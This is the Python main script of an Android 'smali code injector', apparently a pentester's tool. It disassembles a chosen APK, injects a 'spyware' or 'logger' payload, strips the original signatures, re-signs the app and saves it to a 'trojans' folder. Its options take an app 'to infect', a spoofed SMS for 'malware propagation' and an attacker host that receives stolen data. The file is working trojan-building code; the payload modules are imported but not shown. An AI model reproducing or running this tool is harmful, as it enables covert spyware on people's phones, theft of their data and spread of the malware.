#!/usr/bin/env python
#    Copyright (C) 2015 Alexandre Teyar

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

# http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
#    limitations under the License. 

import argparse
from color import Color
from logger import Logger
import metadata
import os
import payload
from spyware import Spyware
import shutil
import subprocess
import sys
import util
import zipfile

DEBUG = 1

# List of available payloads
payloads = ["logger","spyware"]

def banner():

    banner = Color.BANNER +  """
       d888888o.       ,o888888o.     8 8888 
     .`8888:' `88.    8888     `88.   8 8888 
     8.`8888.   Y8 ,8 8888       `8.  8 8888 
     `8.`8888.     88 8888            8 8888 
      `8.`8888.    88 8888            8 8888 
       `8.`8888.   88 8888            8 8888 
        `8.`8888.  88 8888            8 8888 
    8b   `8.`8888. `8 8888       .8'  8 8888 
    `8b.  ;8.`8888    8888     ,88'   8 8888 
     `Y8888P ,88P'     `8888888P'     8 8888"""
    print("{}".format(banner))

def copyright():

    copyright = """
       =[ {0}smali-code-injector v1.1-dev{1}       ]
+ -- --=[ Alexandre Teyar @Ares              ]
+ -- --=[ Pentester at Ambersail Ltd.        ]
+ -- --=[ GitHub: https://github.com/AresS31 ]
""".format(Color.YELLOW, Color.RESET)
    print("{}".format(copyright))

def parse_args():
    """ 
    Parse command line arguments.
    """

    parser = argparse.ArgumentParser(description = "Android assembly code injector")

    parser.add_argument("-a", "--app", dest = "app_path", help = "application to infect", required = True, type = str)
    parser.add_argument("-p", "--payload", dest = "payload", help = "payload to inject", choices = payloads, type = str) 
    parser.add_argument("-ppg", "--propagate", dest = "propagate", help = "spoofed SMS to send for the malware propagation", type = str)
    parser.add_argument("-k", "--keywords", dest = "keywords", help = "keyword list (entries separated by ',') to filter the injection on", default = "-1", type = str)
    parser.add_argument("-s", "--search", dest = "search", help = "search the main activity", action= "store_true")
    parser.add_argument("-t", "--target", dest = "target", help = "dir/file to target", default = '', type = str, ) 
    parser.add_argument("-rh", "--rhost", dest = "rhost", help = "attacker's host/ip address for receiving the stolen data", type = str) 

    return parser.parse_args()

def check_args(args):
    """ 
    Validate command line arguments.
    """

    if (os.path.isfile(args.app_path) and args.app_path.endswith(".apk")):
        # or args.search with any other parameter -> BAD!
        if (args.search and (args.payload or args.target or (args.keywords != '-1') or args.rhost or args.propagate)):
            print(Color.ERROR + "usage: type {} -h for further help".format(sys.argv[0]))
            sys.exit(0)
        elif not (args.search or args.payload):
            print(Color.ERROR + "usage: at least one of the following argument is required: [-p], [-s]")
            sys.exit(0)
        else:
            pass

    else:
        print(Color.ERROR + "{} does not exist/is not a valid .apk file".format(os.path.abspath(args.app_path)))
        sys.exit(0)

# updated version using aapt - easier and quicker
# result accuracy needs to be improved
def get_main_activity_from_manifest(app_path):
    """ 
    Return the main activity.
    """

    if not os.path.exists('tmp'):
        os.makedirs('tmp')

    cmd = "aapt dump --values xmlstrings {0} AndroidManifest.xml | grep -w -B5 android.intent.category.LAUNCHER".format(os.path.abspath(app_path))
    # Get the command output which is a byte string
    output = subprocess.check_output([cmd], shell = True)

    return output.decode("UTF-8")

def disassemble(app_path, app_name):

    print(Color.INFO + "{:<50}".format("disassembling..."), end = '', flush = True)

    if not os.path.exists("tmp"):
        os.makedirs("tmp")

    cmd = "baksmali -p {0} -o {1}".format(
        os.path.abspath(app_path), os.path.abspath(os.path.join("tmp", app_name)))
    sp = subprocess.call([cmd], shell = True)

    # Create a copy of the original app's source code 
    if DEBUG == 1:
        util.copy_dir(os.path.join("tmp", app_name), os.path.join("debug", app_name))

    print(Color.DONE)

def reassemble(payload):

    print(Color.INFO + "{:<50}".format("reassembling..."), end = '', flush = True)

    # Create a copy of the infected app's source code 
    if DEBUG == 1:
        util.copy_dir(os.path.join("tmp", payload.app_name), os.path.join("debug", payload.app_name + "-trojan"))

    # Create the classes.dex
    cmd = "smali {0} -o {1}".format(
        os.path.abspath(os.path.join("tmp", payload.app_name)), os.path.abspath(os.path.join("tmp", "classes.dex")))

    sp = subprocess.call([cmd], shell = True)

    ## Move classes.dex and AndroidManifest then clean-up  
    # Create an app_path-mod folder and erase its certificates
    zfile = zipfile.ZipFile(payload.app_path).extractall(os.path.join("tmp", payload.app_name))

    for root, subdirs, files in os.walk(os.path.join("tmp", payload.app_name, "META-INF")):
        for file in files:
            f_path = os.path.join("tmp", payload.app_name, "META-INF", file)
            if (file != "MANIFEST.MF" and (".RSA" in file or ".SF" in file)):
                os.remove(os.path.abspath(f_path))

    # Move the new classes.dex and AndroidManifest into the modified app_path folder
    util.move_file(os.path.join("tmp" ,"classes.dex"), os.path.join("tmp", payload.app_name, "classes.dex"))

    if (payload.name == "spyware"):
        util.move_file(os.path.join("tmp" ,"AndroidManifest.xml"), os.path.join("tmp", payload.app_name, "AndroidManifest.xml"))

    ## Creation of the final .apk
    # Create the app_path-mod.zip, rename it to app_path-mod.apk and remove the app_path-mod folder
    shutil.make_archive(os.path.join("tmp", payload.app_name), "zip", os.path.join("tmp", payload.app_name))

    util.move_file(os.path.join("tmp", payload.app_name + ".zip"), os.path.join("trojans", payload.app_name + ".apk"))
    shutil.rmtree("tmp")

    print(Color.DONE)

    ## Sign the new apk with the certificate within cert/
    print(Color.INFO + "{:<50}".format("signing..."), end = '', flush = True)

    cmd = "jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore cert/my-release-key.keystore \
    -storepass password {0} alias_name".format(os.path.join("trojans", payload.app_name + ".apk"))
    sp = subprocess.call([cmd], shell = True, stdout = subprocess.DEVNULL)

    print(Color.DONE)

def main():

    try:
        banner()
        copyright()

        args = parse_args()
        check_args(args)

        app_path  = os.path.abspath(args.app_path)
        head, tail = os.path.split(app_path)
        app_name = os.path.splitext(tail)[0]

        if (args.search):
            print(Color.INFO + "{:<50}".format("searching the main activity..."), end = '', flush = True)
            main_activity = get_main_activity_from_manifest(app_path)
            print(Color.DONE)
            print(Color.RESULT + "parse the following output: \
            	\n{}".format(main_activity))

        elif (args.payload):
            disassemble(app_path, app_name)

            if(args.payload == "spyware"):
                payload = Spyware(args);
            elif (args.payload == "logger"):
                payload = Logger(args);

            payload.run();
            reassemble(payload)

    except KeyboardInterrupt:
        print(Color.ERROR + "you pressed Ctrl+C")
        if os.path.exists("tmp"):
            shutil.rmtree("tmp", ignore_errors=True)

        sys.exit(0)

if __name__ == "__main__":
    main()